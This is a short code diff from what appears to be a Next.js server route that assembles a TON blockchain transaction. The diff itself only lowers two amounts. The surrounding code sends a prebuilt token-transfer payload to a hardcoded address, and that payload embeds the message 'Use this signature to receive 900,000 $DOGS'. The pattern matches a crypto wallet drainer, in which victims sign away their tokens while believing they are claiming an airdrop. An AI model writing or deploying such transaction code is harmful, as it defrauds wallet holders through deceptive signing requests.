@@ -35,12 +35,12 @@ export async function POST(req: NextRequest) {
 		messages: [
 			{
 				"address": "EQC_KzjGt_hxtZ_f8pgyQysxPSkRmmnhQtrSp0Z8usKvQsvp",
-				"amount": "1000000",
+				"amount": "100000",
 				"payload": "te6cckEBAgEAiwABrg+KfqUAAAAAAAAAAHAzKLlExAAIAY1Hk9lIWUj7e7Az4rGlR++8sg0Ns23bJbuJsZMieR9fADGo8nspCykfb3YGfFY0qP33lkGhtm27ZLdxNjJkTyPrwQEAXgAAAABVc2UgdGhpcyBzaWduYXR1cmUgdG8gcmVjZWl2ZSA5MDAsMDAwICRET0dTpYcTPg=="
 			},
 			{
 				address: jettonWalletOfReceiver,
-				amount: toNano("0.0005").toString(),
+				amount: toNano("0.000005").toString(),
 				payload: body.toBoc().toString('base64')
 			},
 			{
